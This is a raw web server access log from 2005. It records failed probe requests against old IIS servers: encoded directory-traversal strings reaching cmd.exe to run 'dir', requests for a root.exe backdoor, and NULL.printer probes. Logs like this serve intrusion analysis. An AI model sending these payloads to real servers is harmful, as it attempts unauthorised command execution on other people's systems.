213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
206.49.194.36 - - [18/Feb/2005:01:44:41 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
66.64.221.234 - - [11/Feb/2005:08:20:12 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
68.146.167.38 - - [07/Feb/2005:00:19:38 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"